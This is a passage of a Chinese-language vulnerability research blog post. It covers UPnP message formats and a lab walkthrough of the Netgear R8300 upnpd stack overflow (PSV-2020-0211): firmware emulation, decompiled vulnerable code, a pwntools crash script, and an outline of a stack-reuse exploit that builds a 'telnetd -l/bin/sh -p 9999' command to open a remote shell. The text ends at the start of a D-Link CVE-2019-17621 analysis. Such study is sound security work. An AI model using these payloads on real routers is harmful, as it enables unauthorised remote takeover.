class="hljs-name">serviceId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">controlURL</span>&gt;</span>/control<span class="hljs-tag">&lt;/<span class="hljs-name">controlURL</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">eventSubURL</span>&gt;</span>/event<span class="hljs-tag">&lt;/<span class="hljs-name">eventSubURL</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">scpdURL</span>&gt;</span>/scpd.xml<span class="hljs-tag">&lt;/<span class="hljs-name">scpdURL</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">service</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">serviceList</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">device</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h6 id="3-控制请求"><a href="#3-控制请求" class="headerlink" title="3. 控制请求"></a>3. 控制请求</h6><p>UPnP 设备可以通过 SOAP（Simple Object Access Protocol）进行控制。下面是一个控制请求的示例：</p>
+<p><strong>控制请求示例：</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/control</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">HOST</span><span class="hljs-punctuation">: </span>192.168.1.2:5000<br><span class="hljs-attribute">CONTENT-TYPE</span><span class="hljs-punctuation">: </span>text/xml; charset=&quot;utf-8&quot;<br><span class="hljs-attribute">SOAPACTION</span><span class="hljs-punctuation">: </span>&quot;urn:schemas-upnp-org:service:Rendering:1#SetVolume&quot;<br><span class="hljs-attribute">CONTENT-LENGTH</span><span class="hljs-punctuation">: </span>123<br><br><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">s:Envelope</span> <span class="hljs-attr">xmlns:s</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">             <span class="hljs-attr">s:encodingStyle</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">s:Body</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">u:SetVolume</span> <span class="hljs-attr">xmlns:u</span>=<span class="hljs-string">&quot;urn:schemas-upnp-org:service:Rendering:1&quot;</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">NewVolume</span>&gt;</span>10<span class="hljs-tag">&lt;/<span class="hljs-name">NewVolume</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">u:SetVolume</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">s:Body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">s:Envelope</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>SOAPACTION</strong>: 指定要调用的操作。</li>
+<li><strong>NewVolume</strong>: 传递给服务的参数。</li>
+</ul>
+<h6 id="4-事件通知"><a href="#4-事件通知" class="headerlink" title="4. 事件通知"></a>4. 事件通知</h6><p>UPnP 设备可以发布事件通知，告知其他设备其状态变化。下面是一个事件通知的示例：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">NOTIFY</span> <span class="hljs-string">*</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">HOST</span><span class="hljs-punctuation">: </span>239.255.255.250:3702<br><span class="hljs-attribute">NT</span><span class="hljs-punctuation">: </span>upnp:event<br><span class="hljs-attribute">NTS</span><span class="hljs-punctuation">: </span>upnp:propchange<br><span class="hljs-attribute">SID</span><span class="hljs-punctuation">: </span>uuid:12345678-1234-5678-1234-123456789abc<br><span class="hljs-attribute">SEQ</span><span class="hljs-punctuation">: </span>0<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">e:PropertySet</span> <span class="hljs-attr">xmlns:e</span>=<span class="hljs-string">&quot;urn:schemas-upnp-org:event-1-0&quot;</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">e:Volume</span>&gt;</span>10<span class="hljs-tag">&lt;/<span class="hljs-name">e:Volume</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">e:PropertySet</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>NT</strong>: 表示通知类型。</li>
+<li><strong>NTS</strong>: 通知子类型，表示事件类型。</li>
+<li><strong>SID</strong>: 订阅 ID，用于标识订阅的客户端。</li>
+<li><strong>SEQ</strong>: 序列号，每次通知递增。</li>
+</ul>
+<p>UPnP 数据包涉及多个协议和消息格式，包括设备发现、控制和事件通知。通过这些数据包，设备可以在网络中自动发现、控制和交换信息，从而实现无缝连接和互动。</p>
+<h4 id="PSV-2020-0211-Netgear-R8300-UPnP栈溢出漏洞分析"><a href="#PSV-2020-0211-Netgear-R8300-UPnP栈溢出漏洞分析" class="headerlink" title="PSV-2020-0211 Netgear R8300 UPnP栈溢出漏洞分析"></a>PSV-2020-0211 Netgear R8300 UPnP栈溢出漏洞分析</h4><h5 id="固件模拟"><a href="#固件模拟" class="headerlink" title="固件模拟"></a>固件模拟</h5><p>固件下载地址<a target="_blank" rel="noopener" href="https://www.netgear.com/support/product/r8300/">NIGHTHAWK X8 R8300 | AC5000 SMART WIFI ROUTER | NETGEAR SUPPORT</a></p>
+<p>binwalk -Me 正常解包</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240820022530260.png" srcset="/img/loading.gif" lazyload alt="image-20240820022530260"></p>
+<p>这里使用qemu-system模拟</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> tunctl -t tap0 -u `whoami`<br><span class="hljs-attribute">sudo</span> ifconfig tap0 <span class="hljs-number">192.168.2.1</span>/<span class="hljs-number">24</span><br><span class="hljs-attribute">qemu</span>-system-arm -M vexpress-a9 -kernel vmlinuz-<span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>-<span class="hljs-number">4</span>-vexpress -initrd initrd.img-<span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>-<span class="hljs-number">4</span>-vexpress -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 -append <span class="hljs-string">&quot;root=/dev/mmcblk0p2&quot;</span> -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic<br></code></pre></td></tr></table></figure>
+
+<p>虚拟机起来以后分配ip</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ifconfig</span> eth0 <span class="hljs-number">192.168.2.2</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure>
+
+<p>scp传送文件系统</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">scp sq.tar root<span class="hljs-variable">@192</span>.<span class="hljs-number">168.2</span>.<span class="hljs-number">2</span><span class="hljs-symbol">:/</span><br></code></pre></td></tr></table></figure>
+
+<p>挂载文件夹、chroot切换目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">mount -t proc /proc ./squashfs-root/proc<br>mount -o <span class="hljs-built_in">bind</span> /dev ./squashfs-root/dev<br></code></pre></td></tr></table></figure>
+
+<p>执行.&#x2F;usr&#x2F;sbin&#x2F;upnpd没有反应，ida查看二进制发现没有&#x2F;var&#x2F;run&#x2F;这个目录</p>
+<img src="image-20240820023504678.png" srcset="/img/loading.gif" lazyload alt="image-20240820023504678" style="zoom:33%;" />
+
+<p>创建&#x2F;tmp&#x2F;var&#x2F;run目录，提示缺少&#x2F;dev&#x2F;nvram</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240820023548508.png" srcset="/img/loading.gif" lazyload alt="image-20240820023548508"></p>
+<p>nvram存储了路由器配置信息，仿真中这里出错需要hook劫持一个与nvram相关的动态链接库。</p>
+<p>网上有一个写好的，我们只要把他编译就好了</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/therealsaumil/custom_nvram/master/custom_nvram_r6250.c">raw.githubusercontent.com&#x2F;therealsaumil&#x2F;custom_nvram&#x2F;master&#x2F;custom_nvram_r6250.c</a></p>
+<p>但是要注意的是ubuntu现在最新的软件包<code>gcc-arm-linux-gnueabi</code>只对应了armv7架构，我无法在源中直接安装好可以编译ARMv5的gcc。</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240820024349143.png" srcset="/img/loading.gif" lazyload alt="image-20240820024349143"></p>
+<p>这里可以使用docker</p>
+<p>github地址：<a target="_blank" rel="noopener" href="https://github.com/rootkiter/cross-cpu-compile">https://github.com/rootkiter/cross-cpu-compile</a></p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240820024556954.png" srcset="/img/loading.gif" lazyload alt="image-20240820024556954"></p>
+<p>在docker中执行：</p>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift">[root<span class="hljs-meta">@container</span>] # <span class="hljs-regexp">/root/</span>compile_bins<span class="hljs-regexp">/cross-compiler-armv5l/</span>bin<span class="hljs-operator">/</span>armv5l<span class="hljs-operator">-</span>gcc <span class="hljs-operator">-</span><span class="hljs-type">Wall</span> <span class="hljs-operator">-</span>fPIC <span class="hljs-operator">-</span>shared custom_nvram_r6250.c <span class="hljs-operator">-</span>o nvram.so<br></code></pre></td></tr></table></figure>
+
+<p>然后docker cp把nvram.so取回本机，scp传入qemu-sytem虚拟机。</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240820024921534.png" srcset="/img/loading.gif" lazyload alt="image-20240820024921534"></p>
+<p>加载nvram.so之后继续报错，找不到 <code>dlsym</code> 的符号</p>
+<p>我们在文件系统中寻找dlsym的调用</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240820025058755.png" srcset="/img/loading.gif" lazyload alt="image-20240820025058755"></p>
+<p>libdl.so.0有调用dlsym，所以加载nvram.so的同时加载libdl.so.0即可</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240820025241915.png" srcset="/img/loading.gif" lazyload alt="image-20240820025241915"></p>
+<p>这里又提示没有nvram.ini文件</p>
+<p>我是在网上找的一个配置信息将它写入<code>/tmp/nvram.ini</code>中</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">upnpd_debug_level</span>=<span class="hljs-number">9</span><br><span class="hljs-attr">lan_ipaddr</span>=<span class="hljs-number">192.168</span>.<span class="hljs-number">2.2</span><br><span class="hljs-attr">hwver</span>=R8500<br><span class="hljs-attr">friendly_name</span>=R8300<br><span class="hljs-attr">upnp_enable</span>=<span class="hljs-number">1</span><br><span class="hljs-attr">upnp_turn_on</span>=<span class="hljs-number">1</span><br><span class="hljs-attr">upnp_advert_period</span>=<span class="hljs-number">30</span><br><span class="hljs-attr">upnp_advert_ttl</span>=<span class="hljs-number">4</span><br><span class="hljs-attr">upnp_portmap_entry</span>=<span class="hljs-number">1</span><br><span class="hljs-attr">upnp_duration</span>=<span class="hljs-number">3600</span><br><span class="hljs-attr">upnp_DHCPServerConfigurable</span>=<span class="hljs-number">1</span><br><span class="hljs-attr">wps_is_upnp</span>=<span class="hljs-number">0</span><br><span class="hljs-attr">upnp_sa_uuid</span>=<span class="hljs-number">00000000000000000000</span><br><span class="hljs-attr">lan_hwaddr</span>=AA:BB:CC:DD:EE:FF<br></code></pre></td></tr></table></figure>
+
+<p>然后</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">LD_PRELOAD</span>=<span class="hljs-string">&quot;/nvram.so /lib/libdl.so.0&quot;</span> /usr/sbin/upnpd<br></code></pre></td></tr></table></figure>
+
+
+
+<p>终于把服务模拟了起来</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240819235241968.png" srcset="/img/loading.gif" lazyload alt="image-20240819235241968"></p>
+<h5 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><p>漏洞点在upnpd的sub_1D020()函数内</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c">.......<br><span class="hljs-keyword">if</span> ( (((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)readfds.__fds_bits[(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)dword_C4580 &gt;&gt; <span class="hljs-number">5</span>] &gt;&gt; (dword_C4580 &amp; <span class="hljs-number">0x1F</span>)) &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span> )<br>    &#123;<br>      <span class="hljs-comment">// 将v52数组的第一个元素设置为0</span><br>      v52[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>      <span class="hljs-comment">// 调用recvfrom函数，从dword_C4580对应的套接字接收数据，并将结果赋值给v26</span><br>      v26 = recvfrom(dword_C4580, v52, <span class="hljs-number">0x1FFF</span>u, <span class="hljs-number">0</span>, &amp;v56, v59);<br>      <span class="hljs-comment">// 将v56结构体的sa_data字段的第2个字节到第6个字节的值转换为整数，并将结果赋值给v27</span><br>      v27 = *(_DWORD *)&amp;v56.sa_data[<span class="hljs-number">2</span>];<br>      <span class="hljs-comment">// 将readfds.__fds_bits数组的第(dword_C4580右移5位)个元素的值与1左移(dword_C4580与0x1F进行按位与运算)的结果进行按位取反，并将结果赋值给readfds.__fds_bits数组的第(dword_C4580右移5位)个元素</span><br>      readfds.__fds_bits[(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)dword_C4580 &gt;&gt; <span class="hljs-number">5</span>] &amp;= ~(<span class="hljs-number">1</span> &lt;&lt; (dword_C4580 &amp; <span class="hljs-number">0x1F</span>));<br>      <span class="hljs-comment">// 如果v27不等于0，则说明接收到的数据地址不为0.0.0.0</span><br>      <span class="hljs-keyword">if</span> ( v27 )<br>      &#123;<br>        <span class="hljs-comment">// 如果v26大于0，则说明接收数据成功</span><br>        <span class="hljs-keyword">if</span> ( v26 )<br>        &#123;<br>          <span class="hljs-comment">// 调用inet_ntoa_b函数，将v27的值转换为字符串形式的IP地址，并将结果赋值给v55</span><br>          inet_ntoa_b(v27, (<span class="hljs-type">int</span>)v55);<br>          <span class="hljs-comment">// 将v52数组的第v26个元素设置为0</span><br>          v52[v26] = <span class="hljs-number">0</span>;<br>          <span class="hljs-comment">// 调用acosNvramConfig_match函数，判断&quot;upnp_turn_on&quot;的值是否为&quot;1&quot;，如果结果为true，则调用sub_25E04函数</span><br>          <span class="hljs-keyword">if</span> ( acosNvramConfig_match((<span class="hljs-type">int</span>)<span class="hljs-string">&quot;upnp_turn_on&quot;</span>, (<span class="hljs-type">int</span>)<span class="hljs-string">&quot;1&quot;</span>) )<br>            sub_25E04(v52, (<span class="hljs-type">int</span>)v55, (<span class="hljs-type">unsigned</span> __int16)(*(_WORD *)v56.sa_data &lt;&lt; <span class="hljs-number">8</span>) | HIBYTE(*(_WORD *)v56.sa_data));<br>        &#125;<br>        <span class="hljs-comment">// 否则，说明接收数据失败，打印错误信息</span><br>        <span class="hljs-keyword">else</span><br>        &#123;<br>          sub_B814(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;%s(%d):EOF...\n&quot;</span>, <span class="hljs-string">&quot;upnp_main&quot;</span>, <span class="hljs-number">883</span>);<br>        &#125;<br>      &#125;<br>      <span class="hljs-comment">// 否则，说明接收到的数据地址为0.0.0.0，打印错误信息</span><br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        sub_B814(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;%s(%d):Got Error address 0.0.0.0\n&quot;</span>, <span class="hljs-string">&quot;upnp_main&quot;</span>, <span class="hljs-number">877</span>);<br>      &#125;<br>      <span class="hljs-comment">// 继续循环</span><br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br>.........<br></code></pre></td></tr></table></figure>
+
+<p>这个函数负责处理 UPnP 设备的发现和控制。无限循环，它不断地监听 UDP 广播和 HTTP 请求。</p>
+<p>当接收到 UDP 广播时，代码会检查设备是否处于活动状态，并根据配置信息发送响应。当接收到 HTTP 请求时，代码会解析请求并执行相应的操作。</p>
+<p>这段代码首先检查 <code>readfds.__fds_bits</code> 数组中对应 <code>dword_C4580</code> 的位是否被设置。<code>dword_C4580</code> 是一个 UDP 套接字的描述符，<code>readfds</code> 是一个文件描述符集合，用于跟踪哪些文件描述符准备好进行读取操作。</p>
+<p>如果该位被设置，说明 UDP 套接字 <code>dword_C4580</code> 有数据可读。然后代码执行以下操作：</p>
+<ol>
+<li><strong>清空 <code>v52</code> 数组：</strong> 将 <code>v52</code> 数组的第一个元素设置为 0，用于存储接收到的数据。</li>
+<li><strong>接收数据：</strong> 调用 <code>recvfrom</code> 函数从 <code>dword_C4580</code> 套接字接收数据，并将其保存在<code>v52</code>指向的内存空间中。。</li>
+<li><strong>获取源地址：</strong> 从 <code>v56</code> 结构体中提取源地址，并将其存储在 <code>v27</code> 变量中。</li>
+<li><strong>清除 <code>readfds</code> 中的位：</strong> 将 <code>readfds</code> 数组中对应 <code>dword_C4580</code> 的位清除，以表示已经处理了该套接字上的数据。</li>
+<li><strong>处理数据：</strong> 如果源地址不为 0.0.0.0，并且接收数据成功，则调用 <code>inet_ntoa_b</code> 函数将源地址转换为字符串形式的 IP 地址，并将数据存储在 <code>v52</code> 数组中。如果 <code>upnp_turn_on</code> 的值为 “1”，则调用 <code>sub_25E04</code> 函数处理接收到的数据。</li>
+<li><strong>处理错误：</strong> 如果接收数据失败，则打印错误信息。如果源地址为 0.0.0.0，则打印错误信息。</li>
+</ol>
+<p>套接字接收到数据传入了sub_25E04()，传入该函数的第一个参数为<code>v52</code>，即指向接收的<code>socket</code>数据。</p>
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">sub_25E04(v52, (int)v55, (unsigned __int16)<span class="hljs-comment">(*(_WORD *)</span>v56.sa_data &lt;&lt; <span class="hljs-number">8</span>) | HIBYTE<span class="hljs-comment">(*(_WORD *)</span>v56.sa_data))<span class="hljs-punctuation">;</span><br></code></pre></td></tr></table></figure>
+
+<p> sub_25E04()函数中，<code>a1</code>为传入的socket数据，<code>v38</code>指向栈上的局部缓冲区调用<code>strcpy()</code>进行数据拷贝，由于缺乏长度校验，当构造一个超长的数据包时，拷贝时会出现缓冲区溢出。</p>
+<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs prolog">......<br>  char v38[<span class="hljs-number">12</span>]; // [sp+<span class="hljs-number">24</span>h] [bp<span class="hljs-number">-634</span>h] <span class="hljs-symbol">BYREF</span><br>  int s[<span class="hljs-number">10</span>]; // [sp+<span class="hljs-number">600</span>h] [bp<span class="hljs-number">-58</span>h] <span class="hljs-symbol">BYREF</span><br>  char *v40; // [sp+<span class="hljs-number">628</span>h] [bp<span class="hljs-number">-30</span>h] <span class="hljs-symbol">BYREF</span><br>  <span class="hljs-symbol">__int16</span> v41; // [sp+<span class="hljs-number">62</span><span class="hljs-symbol">Ch</span>] [bp<span class="hljs-number">-2</span><span class="hljs-symbol">Ch</span>] <span class="hljs-symbol">BYREF</span><br><br>  v41 = <span class="hljs-number">32</span>;<br>  sub_B814(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;%s(%d):\n&quot;</span>, <span class="hljs-string">&quot;ssdp_http_method_check&quot;</span>, <span class="hljs-number">203</span>);<br>  if ( dword_93AE0 == <span class="hljs-number">1</span> )<br>    return <span class="hljs-number">0</span>;<br>  v40 = v38;<br>  strcpy(v38, a1);<br>......<br></code></pre></td></tr></table></figure>
+
+<h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240820005128933.png" srcset="/img/loading.gif" lazyload alt="image-20240820005128933"></p>
+<p>可以看到NX保护已开</p>
+<p>ssd的漏洞公开中提到：</p>
+<p>“路由器已打开 ASLR 缓解措施，我们可以使用 ROP 攻击绕过该缓解措施。但是，我们正在通过使用 <strong>strcpy</strong> 执行复制调用，它对 NULL 字节很敏感，这反过来会阻止我们使用 ROP 攻击。因此，要使用包含 NULL 字节的地址，我们需要使用堆栈重用攻击。”</p>
+<p>链接：<a target="_blank" rel="noopener" href="https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/">SSD 公告 - Netgear Nighthawk R8300 upnpd PreAuth RCE - SSD 安全披露 (ssd-disclosure.com)</a></p>
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-built_in">io</span> = remote(<span class="hljs-string">&quot;192.168.2.2&quot;</span>,<span class="hljs-number">1900</span>,typ=<span class="hljs-string">&#x27;udp&#x27;</span>)<br>payload  = b<span class="hljs-string">&#x27;M-SEARCH * HTTP/1.1 \r\n&#x27;</span><br>payload += b<span class="hljs-string">&#x27;Man: &quot;ssdp:discover&quot; \r\n&#x27;</span><br>payload += b<span class="hljs-string">&#x27;MX: %s \r\n&#x27;</span> % (b<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">200</span>)<br><span class="hljs-built_in">io</span>.send(payload)<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240820012009328.png" srcset="/img/loading.gif" lazyload alt="image-20240820012009328"></p>
+<p>wireshark抓包看一下</p>
+<img src="image-20240820103700236.png" srcset="/img/loading.gif" lazyload alt="image-20240820103700236" style="zoom:200%;" />
+
+
+
+
+
+
+
+
+
+<p>此时可以控制返回地址，但是最后一位归零，原因如下</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-number">1</span>.首先溢出覆盖了非叶函数的返回地址。一旦这个函数执行它的结束语来恢复保存的值，保存的<span class="hljs-built_in">LR</span>就被弹出到<span class="hljs-built_in">PC</span>中返回给调用者。<br><span class="hljs-number">2</span>.其次关于最低有效位的一个注意事项：BX指令将加载到<span class="hljs-built_in">PC</span>的地址的LSB复制到CPSR寄存器的T状态位，CPSR寄存器在<span class="hljs-meta">ARM</span>和<span class="hljs-meta">Thumb</span>模式之间切换：<span class="hljs-meta">ARM</span>（LSB<span class="hljs-number">=0</span>）/<span class="hljs-meta">Thumb</span>（LSB<span class="hljs-number">=1</span>）。<br>我们可以看到R8300是运行在<span class="hljs-meta">THUMB</span>状态：<br>当处理器处于<span class="hljs-meta">ARM</span>状态时，每条<span class="hljs-meta">ARM</span>指令为<span class="hljs-number">4</span>个字节，所以<span class="hljs-built_in">PC</span>寄存器的值为当前指令地址 + <span class="hljs-number">8</span>字节<br>当处理器处于<span class="hljs-meta">Thumb</span>状态时，每条<span class="hljs-meta">Thumb</span>指令为<span class="hljs-number">2</span>字节，所以<span class="hljs-built_in">PC</span>寄存器的值为当前指令地址 + <span class="hljs-number">4</span>字节<br>因此保存的<span class="hljs-built_in">LR</span>（用<span class="hljs-number">0x61616161</span>覆盖）被弹出到<span class="hljs-built_in">PC</span>中，然后弹出地址的LSB被写入CPSR寄存器T位（位<span class="hljs-number">5</span>），最后<span class="hljs-built_in">PC</span>本身的LSB被设置为<span class="hljs-number">0</span>，从而产生<span class="hljs-number">0x61616160</span><br></code></pre></td></tr></table></figure>
+
+<p>这里通过组合两个payload来做到这一点，第一个payload的组成如下：</p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">s.<span class="hljs-built_in">send</span>（<span class="hljs-string">&#x27;a\x00&#x27;</span>+expayload）<br></code></pre></td></tr></table></figure>
+
+<p>在payload的开头发送一个“a\x00”值，以避免触发UPNP漏洞，直到payload位于堆栈中。</p>
+<p>第二个payload将控制 PC 值并将其更改为 <em>0x230f0</em>，并触发堆栈中的第一个paylaod。<em>0x230f0</em> gadget可以控制栈指针</p>
+<p>使用 <code>strcpy</code> 调用在 bss 上拼接出命令字符串 <code>telnetd\x20-l/bin/sh\x20-p\x209999\x20&amp;\x20\x00</code>，并调整 R0 指向这段内存，然后跳转 <code>system</code> 执行即可。</p>
+<img src="image-20240820014425461.png" srcset="/img/loading.gif" lazyload alt="image-20240820014425461" style="zoom:50%;" />
+
+
+
+
+
+
+
+
+
+
+
+<h4 id="CVE-2019-17621-Dlink-818l-RCE"><a href="#CVE-2019-17621-Dlink-818l-RCE" class="headerlink" title="CVE-2019-17621 Dlink-818l RCE"></a>CVE-2019-17621 Dlink-818l RCE</h4><h5 id="固件模拟-1"><a href="#固件模拟-1" class="headerlink" title="固件模拟"></a>固件模拟</h5><p>FirmAE</p>
+<h5 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><p>漏洞存在于cgibin中ssdpcgi_main函数</p>
+<p>那么我们如何才能把一个ssdp协议的包发送到后端呢</p>
+<p>打开AE的shell输入netstat -anlp查看</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240825194351354.png" srcset="/img/loading.gif" lazyload alt="image-20240825194351354"></p>
+<p>这里出现了1900，ssdp的标准端口，并且由进程httpd所有</p>
+<p>所以ssdp协议包是由httpd接收并将参数转发给cgibin</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240825200611537.png" srcset="/img/loading.gif" lazyload alt="image-20240825200611537"></p>
+<p>cgibin中main函数从全局变量中获取参数进行比较</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240825193826718.png" srcset="/img/loading.gif" lazyload alt="image-20240825193826718"></p>
+<p>动调</p>
